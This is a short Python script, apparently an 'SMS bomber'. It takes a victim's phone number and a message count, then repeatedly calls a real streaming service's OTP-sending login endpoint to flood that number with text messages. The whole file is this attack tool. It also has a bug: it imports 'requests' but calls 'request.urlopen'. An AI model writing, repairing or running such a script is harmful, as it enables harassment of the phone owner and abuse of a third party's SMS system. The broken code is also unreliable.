import os
import time
import requests
os.system('clear')

print ("""                                                                               
                                                                                    
                                                          _____  
                                                         (_____) 
                                                        (_)___   
                                                          (___)_ 
                                                          ____(_)
                                                         (_____) 
                                                                 
                                                                 
   
                                                                               
                                                                               
                                                                                     	
                                                                                
""")

phone  = input("phone number: ")
sms = int(input("amount: "))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ")
	time.sleep(30)
